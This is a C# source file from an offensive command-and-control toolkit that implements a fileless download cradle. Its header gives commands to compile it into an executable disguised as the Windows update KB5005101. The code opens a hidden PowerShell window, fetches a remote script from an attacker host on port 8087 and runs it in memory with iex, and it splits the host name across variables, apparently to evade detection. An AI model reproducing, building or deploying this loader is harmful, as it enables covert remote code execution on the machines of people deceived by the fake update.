/*
   Author: @r00t-3xp10it
   @Meterpeter C2 v2.10.11 FileLess download crandle!

   Title: StandAlone executable cmdlet's FileLess download crandle.
   Description: Program.CS (to be compiled to standalone executable) that allow users to FileLess download\execute external URL's cmdlet's
      
   Dependencies: iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CsOnTheFly.ps1" -OutFile "CsOnTheFly.ps1"|Unblock-File
   Compile: .\CsOnTheFly.ps1 -action "compile" -uri "FileLess_KB5005101.cs" -outfile "Update-KB5005101.exe" -filedescription "KB5005101 21H1 Update" -iconset "true"
*/

using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var IndiaSailing = @"Colombo";
           var TerminalPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
           var WarriorShepard = @"Viriato";

           Process process = new Process();
           process.StartInfo.FileName = TerminalPath;
           process.StartInfo.Arguments = "$VPNproxy=new-object -com WinHttp.WinHttpRequest.5.1;$VPNproxy.open('GET','http://"+WarriorShepard+IndiaSailing+":8087/Update-KB5005101.ps1',$false);$VPNproxy.send();iex $VPNproxy.responseText";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}